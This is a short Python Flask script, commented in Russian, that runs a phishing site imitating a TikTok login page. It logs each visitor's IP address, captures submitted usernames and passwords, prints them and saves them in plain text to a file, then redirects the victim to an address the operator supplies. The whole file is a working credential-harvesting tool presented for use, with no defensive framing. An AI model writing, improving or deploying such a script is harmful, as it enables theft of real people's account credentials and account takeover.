from flask import Flask, render_template, request, redirect, url_for
import webbrowser
import os

# Чтение ссылки из конфигурационного файла
print('Давайте настроим ваш сайт')
action_url = input('Вставьте сюда ссылку, на которую будет перенаправляться пользователь: ')

app = Flask(__name__, template_folder='templates')  # Убедитесь, что путь к шаблонам правильный
username = None

def write_to_file(email, password):
    with open('user_info.txt', 'a') as file:
        file.write(f'Email: {email}, Password: {password}\n')

@app.route("/")
def home():
    user_ip = request.remote_addr
    print(f"User IP address: {user_ip}")
    return render_template('Tiktok.html')

@app.route("/login", methods=["POST"])
def login():
    global username
    username = request.form['username']
    password = request.form['password']
    print('User: ', username)
    print('Password: ', password)
    write_to_file(username, password)  # Запись в файл перед редиректом
    return redirect(url_for('welcome'))

@app.route("/welcome")
def welcome():
    webbrowser.open(action_url)
    return "Redirecting..."

if __name__ == '__main__':
    print("Запуск сервера...")
    app.run(host='0.0.0.0', port=8888, debug=True)
